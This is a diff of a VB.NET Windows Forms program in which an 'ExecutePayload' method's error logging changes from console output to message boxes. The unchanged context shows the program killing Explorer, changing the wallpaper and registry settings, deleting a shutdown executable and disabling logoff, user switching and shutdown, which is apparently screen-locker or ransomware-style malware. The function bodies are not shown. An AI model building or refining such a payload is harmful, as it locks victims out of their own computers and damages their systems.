@@ -1498,7 +1498,7 @@ Public Class Form1
                                           StartAnimationLoop()
                                       End Sub)
             Catch ex As Exception
-                Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
+                MessageBox.Show("Error in AnimationTimer.Start: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
 
             ' Kill Explorer and related processes
@@ -1512,7 +1512,7 @@ Public Class Form1
                                           SetWallpaper()
                                       End Sub)
             Catch ex As Exception
-                Console.WriteLine("Error in SetWallpaper: " & ex.Message)
+                MessageBox.Show("Error in SetWallpaper: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
 
             ' Write a message to Notepad with error handling
@@ -1521,7 +1521,7 @@ Public Class Form1
                                           WriteMessageToNotepad()
                                       End Sub)
             Catch ex As Exception
-                Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
+                MessageBox.Show("Error in WriteMessageToNotepad: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
 
             ' Kill grant access and delete shutdown executable
@@ -1530,7 +1530,7 @@ Public Class Form1
                                           KillGrantAccessAndDeleteShutdownExe()
                                       End Sub)
             Catch ex As Exception
-                Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
+                MessageBox.Show("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
 
             ' Update registry settings with error handling
@@ -1539,7 +1539,7 @@ Public Class Form1
                                           UpdateRegistrySettings()
                                       End Sub)
             Catch ex As Exception
-                Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
+                MessageBox.Show("Error in UpdateRegistrySettings: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
 
             ' Disable logoff, switch user, and shutdown options
@@ -1548,14 +1548,15 @@ Public Class Form1
                                           DisableLogoffSwitchUserAndShutdown()
                                       End Sub)
             Catch ex As Exception
-                Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
+                MessageBox.Show("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
 
         Catch ex As Exception
             ' General exception handling for the entire ExecutePayload method
-            Console.WriteLine("An error occurred in ExecutePayload: " & ex.Message)
+            MessageBox.Show("An error occurred in ExecutePayload: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
     End Sub
+
 
     ' Event handler for the Exit button
     Private Sub ExitButton_Click(sender As Object, e As EventArgs) Handles ExitButton.Click
